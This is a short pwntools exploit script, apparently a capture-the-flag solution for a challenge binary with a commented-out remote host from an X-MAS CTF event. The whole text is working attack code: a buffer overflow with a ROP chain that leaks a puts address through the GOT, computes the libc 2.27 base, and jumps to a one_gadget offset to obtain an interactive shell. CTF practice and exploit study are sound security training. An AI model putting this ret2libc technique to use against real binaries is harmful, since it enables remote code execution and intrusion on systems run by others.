from pwn import *

target = process("./chall", env = {"LD_PRELOAD":"./libc-2.27.so"})
#gdb.attach(target, gdbscript = 'b *0x401201')

#target = remote("challs.xmas.htsp.ro", 12006)
libc = ELF("libc-2.27.so")

elf = ELF("chall")
popRdi = p64(0x401273)


payload = ""
payload += "0"*0x12
payload += popRdi
payload += p64(0x404018)
payload += p64(0x401030)
payload += p64(0x401167)

target.sendline(payload)

print target.recvline()
print target.recvline()

leak = target.recvline().strip("\n")
leak = u64(leak + "\x00"*(8-len(leak)))
libcBase = leak - libc.symbols["puts"]

log.info("leak is: " + hex(libcBase))

payload = ""
payload += "0"*0x12
payload += p64(libcBase + 0x4f2c5)
#payload += popRdi
#payload += p64(libcBase + 0x1afb84)
#payload += p64(libcBase + libc.symbols["system"])

target.sendline(payload)

target.interactive()
